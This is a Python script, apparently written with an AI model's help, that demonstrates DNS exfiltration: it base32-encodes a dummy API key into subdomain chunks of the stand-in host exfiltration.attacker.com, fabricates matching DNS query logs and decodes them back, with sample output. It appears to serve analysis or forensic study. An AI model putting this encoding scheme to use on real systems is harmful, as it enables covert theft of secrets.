import base64
import re

def decode_dns_exfiltration(domains_or_logs):
    """
    Decode data exfiltrated via DNS subdomains
    
    Args:
        domains_or_logs: Either a list of domain strings or a log string containing domain names
    
    Returns:
        Original decoded string
    """
    # If input is a single string (logs), extract domains
    if isinstance(domains_or_logs, str):
        # Extract subdomains from logs using regex
        pattern = r'([a-z2-7]{1,63})\.exfiltration\.attacker\.com'
        matches = re.findall(pattern, domains_or_logs)
        chunks = matches
    else:
        # Assume it's a list of domain strings
        chunks = []
        for domain in domains_or_logs:
            # Extract the subdomain part before .exfiltration.attacker.com
            match = re.match(r'([a-z2-7]+)\.exfiltration\.attacker\.com', domain)
            if match:
                chunks.append(match.group(1))
    
    if not chunks:
        raise ValueError("No valid exfiltration domains found")
    
    print(f"Extracted chunks: {chunks}")
    
    # Concatenate all chunks
    encoded_data = ''.join(chunks)
    print(f"Concatenated (lowercase): {encoded_data}")
    
    # Convert to uppercase for base32 decoding
    encoded_data = encoded_data.upper()
    print(f"Uppercase: {encoded_data}")
    
    # Add padding back for base32 decoding
    # Base32 padding is '=' and length should be multiple of 8
    padding_needed = (8 - len(encoded_data) % 8) % 8
    encoded_data += '=' * padding_needed
    print(f"With padding: {encoded_data}")
    
    try:
        # Decode from base32
        decoded_bytes = base64.b32decode(encoded_data)
        decoded_string = decoded_bytes.decode('utf-8')
        return decoded_string
    except Exception as e:
        print(f"Error decoding: {e}")
        return None

def create_example_logs_from_data(data_string):
    """
    Create example logs from actual data for testing
    """
    # Encode the data
    encoded = base64.b32encode(data_string.encode()).decode().lower()
    encoded = encoded.replace('=', '')
    
    # Split into chunks
    chunks = [encoded[i:i+40] for i in range(0, len(encoded), 40)]
    
    # Create log entries
    logs = []
    timestamps = ["10:30:45", "10:30:46", "10:30:47"]
    for i, chunk in enumerate(chunks):
        log_line = f"2024-01-15 {timestamps[i % len(timestamps)]} DNS query: {chunk}.exfiltration.attacker.com"
        logs.append(log_line)
    
    return "\n".join(logs)

def decode_from_logs_with_flexible_padding(log_content):
    """
    More flexible decoder that tries different padding strategies
    """
    # Extract chunks
    pattern = r'([a-z2-7]+)\.exfiltration\.attacker\.com'
    chunks = re.findall(pattern, log_content)
    
    if not chunks:
        print("No chunks found")
        return None
    
    print(f"Extracted chunks: {chunks}")
    
    # Try different combinations
    encoded_data = ''.join(chunks).upper()
    
    # Try different padding lengths
    for padding_len in range(0, 8):
        test_data = encoded_data + ('=' * padding_len)
        try:
            decoded = base64.b32decode(test_data).decode('utf-8')
            print(f"Success with padding length {padding_len}")
            return decoded
        except:
            continue
    
    # Try without removing any characters
    try:
        # Maybe the chunks are in a different order
        for permuted in [chunks, chunks[::-1]]:  # Try forward and reverse
            encoded = ''.join(permuted).upper()
            for padding_len in range(0, 8):
                test_data = encoded + ('=' * padding_len)
                try:
                    decoded = base64.b32decode(test_data).decode('utf-8')
                    print(f"Success with different chunk order, padding {padding_len}")
                    return decoded
                except:
                    continue
    except:
        pass
    
    print("All decoding attempts failed")
    return None

# Advanced decoder with more features
class DNSExfiltrationDecoder:
    """
    Advanced decoder for DNS exfiltration with multiple features
    """
    
    def __init__(self, domain_suffix=".exfiltration.attacker.com"):
        self.domain_suffix = domain_suffix
        self.chunks = []
    
    def add_domain(self, domain):
        """Add a single domain to the decoder"""
        match = re.match(f'([a-z2-7]+){re.escape(self.domain_suffix)}', domain)
        if match:
            self.chunks.append(match.group(1))
            return True
        return False
    
    def add_log_line(self, log_line):
        """Extract and add domain from a log line"""
        pattern = f'([a-z2-7]+){re.escape(self.domain_suffix)}'
        match = re.search(pattern, log_line)
        if match:
            self.chunks.append(match.group(1))
            return True
        return False
    
    def add_log_string(self, log_string):
        """Extract all domains from a log string"""
        pattern = f'([a-z2-7]+){re.escape(self.domain_suffix)}'
        matches = re.findall(pattern, log_string)
        self.chunks.extend(matches)
        return len(matches) > 0
    
    def decode(self, flexible=True):
        """Decode all collected chunks"""
        if not self.chunks:
            print("No chunks collected")
            return None
        
        print(f"Collected chunks: {self.chunks}")
        
        if flexible:
            return self._flexible_decode()
        else:
            return self._strict_decode()
    
    def _strict_decode(self):
        """Strict decoding with standard padding"""
        encoded_data = ''.join(self.chunks).upper()
        padding_needed = (8 - len(encoded_data) % 8) % 8
        encoded_data += '=' * padding_needed
        
        try:
            decoded_bytes = base64.b32decode(encoded_data)
            return decoded_bytes.decode('utf-8')
        except Exception as e:
            print(f"Strict decoding error: {e}")
            return None
    
    def _flexible_decode(self):
        """Flexible decoding that tries multiple approaches"""
        encoded_base = ''.join(self.chunks).upper()
        
        # Try different padding lengths
        for padding_len in range(0, 9):
            try:
                test_data = encoded_base + ('=' * padding_len)
                decoded = base64.b32decode(test_data).decode('utf-8')
                print(f"Success with padding length {padding_len}")
                return decoded
            except:
                continue
        
        # Try reversing chunk order
        reversed_chunks = self.chunks[::-1]
        encoded_reversed = ''.join(reversed_chunks).upper()
        
        for padding_len in range(0, 9):
            try:
                test_data = encoded_reversed + ('=' * padding_len)
                decoded = base64.b32decode(test_data).decode('utf-8')
                print(f"Success with reversed chunks, padding {padding_len}")
                return decoded
            except:
                continue
        
        print("All flexible decoding attempts failed")
        return None
    
    def reset(self):
        """Reset the decoder"""
        self.chunks = []
        return self

# Fixed example function
def example_with_captured_logs():
    """
    Example showing how to decode from actual captured logs
    """
    # First, create realistic logs from actual data
    test_data = "sk-12345-example-api-key-for-testing"
    realistic_logs = create_example_logs_from_data(test_data)
    
    print("Created realistic logs from test data:")
    print(realistic_logs)
    print()
    
    print("Original data that was exfiltrated:")
    print(f"Original: {test_data}")
    encoded = base64.b32encode(test_data.encode()).decode().lower().replace('=', '')
    chunks = [encoded[i:i+40] for i in range(0, len(encoded), 40)]
    print(f"Encoded chunks: {chunks}")
    print()
    
    # Method 1: Using the flexible decoder function
    print("Method 1: Using flexible decoder function")
    decoded = decode_from_logs_with_flexible_padding(realistic_logs)
    if decoded:
        print(f"Decoded: {decoded}")
        print(f"Bytes recovered: {len(decoded)}")
        print(f"Success: {test_data == decoded}")
    
    # Method 2: Using the decoder class
    print("\nMethod 2: Using decoder class with flexible mode")
    decoder = DNSExfiltrationDecoder()
    decoder.add_log_string(realistic_logs)
    decoded = decoder.decode(flexible=True)
    if decoded:
        print(f"Decoded: {decoded}")
        print(f"Bytes recovered: {len(decoded)}")
        print(f"Would exfiltrate {len(decoded)} bytes")

# Run the fixed examples
if __name__ == "__main__":
    print("=" * 60)
    print("FIXED DNS Exfiltration Decoder Demo")
    print("=" * 60)
    
    # Basic example with actual data
    print("\n1. Basic Encoding/Decoding Example:")
    print("-" * 40)
    original_data = "sk-12345-example-api-key-for-testing"
    
    # Encode
    encoded = base64.b32encode(original_data.encode()).decode().lower().replace('=', '')
    chunks = [encoded[i:i+40] for i in range(0, len(encoded), 40)]
    domains = [f"{chunk}.exfiltration.attacker.com" for chunk in chunks]
    
    print(f"Original: {original_data}")
    print(f"Encoded chunks: {chunks}")
    print(f"DNS domains: {domains}")
    
    # Decode
    decoded = decode_dns_exfiltration(domains)
    if decoded:
        print(f"\nDecoded: {decoded}")
        print(f"Recovered bytes: {len(decoded)}")
        print(f"Would exfiltrate {len(decoded)} bytes")
    
    print("\n" + "=" * 60)
    print("2. Log-based decoding with realistic logs:")
    print("-" * 40)
    example_with_captured_logs()

"""
============================================================
FIXED DNS Exfiltration Decoder Demo
============================================================

1. Basic Encoding/Decoding Example:
----------------------------------------
Original: sk-12345-example-api-key-for-testing
Encoded chunks: ['onvs2mjsgm2dkllfpbqw24dmmuwwc4djfvvwk6jn', 'mzxxellumvzxi2lom4']
DNS domains: ['onvs2mjsgm2dkllfpbqw24dmmuwwc4djfvvwk6jn.exfiltration.attacker.com', 'mzxxellumvzxi2lom4.exfiltration.attacker.com']
Extracted chunks: ['onvs2mjsgm2dkllfpbqw24dmmuwwc4djfvvwk6jn', 'mzxxellumvzxi2lom4']
Concatenated (lowercase): onvs2mjsgm2dkllfpbqw24dmmuwwc4djfvvwk6jnmzxxellumvzxi2lom4
Uppercase: ONVS2MJSGM2DKLLFPBQW24DMMUWWC4DJFVVWK6JNMZXXELLUMVZXI2LOM4
With padding: ONVS2MJSGM2DKLLFPBQW24DMMUWWC4DJFVVWK6JNMZXXELLUMVZXI2LOM4======

Decoded: sk-12345-example-api-key-for-testing
Recovered bytes: 36
Would exfiltrate 36 bytes

============================================================
2. Log-based decoding with realistic logs:
----------------------------------------
Created realistic logs from test data:
2024-01-15 10:30:45 DNS query: onvs2mjsgm2dkllfpbqw24dmmuwwc4djfvvwk6jn.exfiltration.attacker.com
2024-01-15 10:30:46 DNS query: mzxxellumvzxi2lom4.exfiltration.attacker.com

Original data that was exfiltrated:
Original: sk-12345-example-api-key-for-testing
Encoded chunks: ['onvs2mjsgm2dkllfpbqw24dmmuwwc4djfvvwk6jn', 'mzxxellumvzxi2lom4']

Method 1: Using flexible decoder function
Extracted chunks: ['onvs2mjsgm2dkllfpbqw24dmmuwwc4djfvvwk6jn', 'mzxxellumvzxi2lom4']
Success with padding length 6
Decoded: sk-12345-example-api-key-for-testing
Bytes recovered: 36
Success: True

Method 2: Using decoder class with flexible mode
Collected chunks: ['onvs2mjsgm2dkllfpbqw24dmmuwwc4djfvvwk6jn', 'mzxxellumvzxi2lom4']
Success with padding length 6
Decoded: sk-12345-example-api-key-for-testing
Bytes recovered: 36
Would exfiltrate 36 bytes

```
Creates realistic logs from actual encoded data for testing

Implements flexible padding strategies that try different padding lengths

Shows the actual chunks being extracted and decoded

Handles edge cases like incorrect chunk order

Properly decodes the data and shows the "Would exfiltrate X bytes" message

The key insight is that base32 decoding requires the correct padding, and the chunks need to be in the right order. The flexible decoder tries multiple approaches to successfully recover the data.
```
"""    